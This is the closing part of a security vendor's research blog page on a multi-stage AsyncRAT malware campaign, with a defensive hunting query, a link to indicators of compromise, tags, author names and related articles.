  * **[Analyzing a Multi-Stage AsyncRAT Campaign via Managed Detection and Response](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence?intrusionSet=Analyzing%20a%20Multi-Stage%20AsyncRAT%20Campaign%20via%20Managed%20Detection%20and%20Response)**
  * 


Hunting Queries

**Trend Vision One™ Search App**

TrendAI Vision One™ customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

_malName: *SHELMA* AND new.bin AND LogType: detection_

The indicators of compromise for this entry can be found [here](/content/dam/trendmicro/global/en/research/26/a/IOC_Analyzing-a-Multi-Stage-AsyncRAT-Campaign-via-MDR.txt).

**  
  
**




Tags

[Malware](/en/research.html?category=trend-micro-research:threats/malware) | [Research](/en/research.html?category=trend-micro-research:article-type/research) | [Phishing](/en/research.html?category=trend-micro-research:threats/phishing) | [Articles, News, Reports](/en/research.html?category=trend-micro-research:medium/article)

###  Authors 

  * Buddy Tancio

Threats Analyst

  * Jed Valderama

Threats Analyst

  * Khristoffer Jocson

Threats Analyst

  * Franklynn Uy

Threats Analyst




[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence ](/en/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)
  * [ A Secure Access Service Edge (SASE) Guide for Leaders ](/en/research/22/h/secure-access-service-edge-sase-security-company.html)
  * [ Why the Open Secure AI Alliance Matters: Open Frontier Models, Open Deployment Flexibility ](/en/research/26/g/open-secure-ai-alliance.html)



[ See all articles ](/en/research.html)

[ ](/en/research.html)